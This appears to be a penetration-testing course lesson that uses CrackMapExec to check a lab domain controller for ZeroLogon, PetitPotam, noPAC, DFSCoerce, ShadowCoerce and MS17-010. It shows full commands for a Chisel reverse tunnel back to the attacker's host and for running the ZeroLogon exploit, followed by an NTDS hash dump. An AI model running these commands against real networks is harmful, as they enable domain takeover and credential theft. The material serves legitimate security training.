# Vulnerability Scan Modules

An everyday activity we perform while penetration testing is trying to identify vulnerabilities. If we can find any, the exploitation work can be straightforward.

CrackMapExec includes some modules that allow us to identify vulnerabilities. In this session, we will review some of them.

***

## Setting Up the Environment

In this scenario, we compromised a server and obtained administrator credentials. This server has two network cards, and our goal is to identify if the domain is vulnerable to attack. The IP address of the domain is 172.16.10.3.

To gain access to the domain, we will use what we learned in the [Proxychains with CME](https://academy.hackthebox.com/module/84/section/827) section and establish a connection with Chisel:

### **Sending Chisel to the Target Machine**

```shell-session
$ crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth

SMB         10.129.204.146  445    WS01             [*] Windows Server 2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:True)
SMB         10.129.204.146  445    WS01             [+] WS01\Administrator:IpreferanewP@$$ (Pwn3d!)
SMB         10.129.204.146  445    WS01             [*] Copy ./chisel.exe to \Windows\Temp\chisel.exe
SMB         10.129.204.146  445    WS01             [+] Created file ./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```

### **Running Chisel as a Server in Our Attack Host**

```shell-session
$ ./chisel server --reverse

2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```

### **Connecting Chisel from the Compromised Device to Our Attack Host**

```shell-session
$ crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks" --local-auth

SMB         10.129.204.146  445    WS01             [*] Windows Server 2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:True)
SMB         10.129.204.146  445    WS01             [+] WS01\Administrator:IpreferanewP@$$ (Pwn3d!)
```

***

## Vulnerability Scan Modules

Most of the vulnerability modules in CrackMapExec are checked only, and we can't use those modules to exploit vulnerabilities. Let's start with the [ZeroLogon vulnerability](https://www.secura.com/uploads/whitepapers/Zerologon.pdf).

### ZeroLogon

An unauthenticated attacker can exploit the [ZeroLogon vulnerability (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) with network access to a domain controller. It needs to start a vulnerable Netlogon session to abuse this vulnerability and eventually take control of the domain. Since connecting to a Domain Controller is the only prerequisite for a successful exploit, the vulnerability is severe.

CrackMapExec includes a module named `zerologon` that identifies if a Domain Controller is vulnerable to ZeroLogon.

### **ZeroLogon Vulnerability Check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -M Zerologon

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
ZEROLOGO... 172.16.10.3     445    DC01             VULNERABLE
ZEROLOGO... 172.16.10.3     445    DC01             Next step: https://github.com/dirkjanm/CVE-2020-1472
```

### PetitPotam

Security researcher [Gilles Lionel](https://twitter.com/topotam77) recently revealed an attack technique called [PetitPotam](https://github.com/topotam/PetitPotam), which allows attackers to compromise the domain by simply gaining access to the enterprise network infrastructure. The method is a classic NTLM relay attack on any offered server service (e.g., a Domain Controller). Lionel also made a proof-of-concept code available on [GitHub PetitPotam](https://github.com/topotam/PetitPotam), demonstrating how attackers can use this specific attack technique to achieve domain compromise.

CrackMapExec includes a module named `petitpotam` that identifies if a Domain Controller is vulnerable to PetitPotam.

### **Petitpotam Vulnerability Check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -M PetitPotam

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
PETITPOT... 172.16.10.3     445    DC01             VULNERABLE
PETITPOT... 172.16.10.3     445    DC01             Next step: https://github.com/topotam/PetitPotam
```

## noPAC

The exploit of the noPAC vulnerability allowed the escalation of privileges of a regular domain user to a domain administrator. The proof of concept (PoC) was released on [GitHub](https://github.com/Ridter/noPac).

CrackMapExec includes a module named `nopac` that identifies if a domain controller is vulnerable to noPAC.

### **noPAC vulnerability check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M nopac

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd 
NOPAC       172.16.10.3     445    DC01             TGT with PAC size 1564
NOPAC       172.16.10.3     445    DC01             TGT without PAC size 759
NOPAC       172.16.10.3     445    DC01             
NOPAC       172.16.10.3     445    DC01             VULNEABLE
NOPAC       172.16.10.3     445    DC01             Next step: https://github.com/Ridter/noPac
```

***

## DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic) published a [proof of concept (PoC)](https://github.com/Wh04m1001/DFSCoerce) for an NTLM relay attack named DFSCoerce. The method leverages the Distributed File System: Namespace Management Protocol (MS-DFSNM) to seize control of a Windows domain.

This attack requires a domain user, and we can use the CrackMapExec module `dfscoerce` to identify if a DC is vulnerable. To check this vulnerability, we will use the account `carole.holmes` with password `Y3t4n0th3rP4ssw0rd`.

### **DFSCoerce Vulnerability Check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M dfscoerce

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd 
DFSCOERC... 172.16.10.3     445    DC01             VULNERABLE
DFSCOERC... 172.16.10.3     445    DC01             Next step: https://github.com/Wh04m1001/DFSCoerce
```

***

## ShadowCoerce

ShadowCoerce was discovered and first detailed by security researcher Lionel Gilles in late 2021 at the end of a presentation showcasing the PetitPotam attack. [Charlie Bromberg](https://twitter.com/_nwodtuhs) created a [proof of concept (PoC)](https://github.com/ShutdownRepo/ShadowCoerce).

Let's use the `carole.holmes` account to check if the DC is vulnerable to this attack using the CrackMapExec module `shadowcoerce`.

### **ShadowCoerce Vulnerability Check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
```

Most authors of vulnerability scanning modules did not include a message if the computer is not vulnerable, so we do not see anything after the command is executed. However, if we check the source code of the `shadowcoerse` module, located at (`./CrackMapExec/cme/modules/shadowcoerce.py`), we will see that the author included some debug logs with (`logging.debug`). If we run CrackMapExec in `debug` mode, it will print those logs.

To run CrackMapExec in debug mode, we can use the option `--verbose` before the protocol.

### **Running shadowcoerce Module with Verbose Enabled**

```shell-session
$ proxychains4 -q crackmapexec --verbose smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

DEBUG:root:Passed args:
{'aesKey': None,              
 'amsi_bypass': None,                                                                          
 'clear_obfscripts': False,                                                                    
 'codec': 'utf-8',       
 'computers': None, 
 'connectback_host': None,
 'content': False,
 'continue_on_success': False,
 'cred_id': [],
 'darrell': False,
 'depth': None, 
 'disks': False,
 'domain': None,
 'enabled': False,    
 'exclude_dirs': '',
 'exec_method': None,                                                                          
 'execute': None,                                                                              
 'export': None,                                                                               
 'fail_limit': None,                       
 'force_ps32': False,           
 'gen_relay_list': None,       
 'get_file': None,                                                                             
 'gfail_limit': None,      
 'groups': None,
 'hash': [],
 'jitter': None,
 'kdcHost': None,
 'kerberos': False,
 'laps': None,
 'list_modules': False,
 'local_auth': False,
 'local_groups': None,
 'loggedon_users': False,

<SNIP>

 'wmi': None,
 'wmi_namespace': 'root\\cimv2'}
DEBUG:asyncio:Using selector: EpollSelector
DEBUG Using selector: EpollSelector
DEBUG:root:Running
DEBUG Running
DEBUG:root:Started thread poller
DEBUG Started thread poller
SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
DEBUG:root:add_credential(credtype=plaintext, domain=INLANEFREIGHT, username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None, pillaged_from=None) => None
DEBUG add_credential(credtype=plaintext, domain=INLANEFREIGHT, username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None, pillaged_from=None) => None
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd 
DEBUG:root:Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG:root:Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG:root:Connected!
DEBUG Connected!
DEBUG:root:Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG:root:Something went wrong, check error status => SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)
DEBUG Something went wrong, check error status => SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)
DEBUG:root:Successfully bound!
DEBUG Successfully bound!
DEBUG:root:ipsc = False
DEBUG ipsc = False
DEBUG:root:Using the default IsPathSupported
DEBUG Using the default IsPathSupported
DEBUG:root:Sending IsPathSupported!
DEBUG Sending IsPathSupported!
DEBUG:root:Something went wrong, check error status => SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)
DEBUG Something went wrong, check error status => SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)
DEBUG:root:Attack may of may not have worked, check your listener...
DEBUG Attack may of may not have worked, check your listener...
DEBUG:root:Target not vulnerable to ShadowCoerce
DEBUG Target not vulnerable to ShadowCoerce
DEBUG:root:Stopped thread poller
DEBUG Stopped thread poller
```

The lines that start with `DEBUG` correspond to `logging.debug`. We can see in the last lines it indicates that the target is not vulnerable.

***

## MS17-010 (EternalBlue)

MS17-010, aka EternalBlue, is a security patch for Windows operating systems released by Microsft on March 14, 2017. The patch is for a critical unauthenticated remote code execution flaw in the SMB service. To learn more about this vulnerability, we can read the [Microsoft Security Bulletin MS17-010 - Critical](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN).

CrackMapExec includes a module named `ms17-010` that identifies if a domain controller is vulnerable to MS17-010.

### **MS17-010 Vulnerability Check**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -M ms17-010

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
```

***

## Exploiting a Vulnerability

We have seen many vulnerabilities. Let's try to exploit one of them: ZeroLogon. Let's go to the link provided by the module [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) and use it:

### **Exploiting ZeroLogon**

```shell-session
al1abb@htb[/htb]$ git clone https://github.com/dirkjanm/CVE-2020-1472 -q
al1abb@htb[/htb]$ cd CVE-2020-1472/
al1abb@htb[/htb]$ proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3 
                              
Performing authentication attempts...                                                          
==============================================================================================================================================================================================
==============================================================================================================================================================
Target vulnerable, changing account password to empty string  
                                               
Result: 0                                                                                      
                                                                                               
Exploit complete!
```

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.10.3 -u 'DC01$' -p '' --ntds

SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\DC01$: 
SMB         172.16.10.3     445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         172.16.10.3     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.10.3     445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901973d9a344:::
SMB         172.16.10.3     445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.10.3     445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2c6454dbf95abc7b0a543b90f6f96f66:::
SMB         172.16.10.3     445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.10.3     445    DC01             derek.walker:1103:aad3b435b51404eeaad3b435b51404ee:69cc8c83c56aeeb7571bbeec20c6ef65:::
SMB         172.16.10.3     445    DC01             carole.holmes:1104:aad3b435b51404eeaad3b435b51404ee:37ef72fcf42a4021948c7ed7b33ccf21:::
SMB         172.16.10.3     445    DC01             callum.dixon:1105:aad3b435b51404eeaad3b435b51404ee:3e7c48255206470a13543b27b7af18de:::
SMB         172.16.10.3     445    DC01             beth.richards:1106:aad3b435b51404eeaad3b435b51404ee:de3d16603d7ded97bb47cd6641b1a392:::
SMB         172.16.10.3     445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.10.3     445    DC01             WS01$:1601:aad3b435b51404eeaad3b435b51404ee:ee7c60ba01f7d361ad5479c86d3ab3fc:::
SMB         172.16.10.3     445    DC01             [+] Dumped 10 NTDS hashes to /home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-09_065546.ntds of which 8 were added to the database
SMB         172.16.10.3     445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.10.3     445    DC01             [*] cat /home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-09_065546.ntds | grep -iv disabled | cut -d ':' -f1
```

We can also try to exploit other vulnerabilities, but we must reset the target machine before exploiting it.

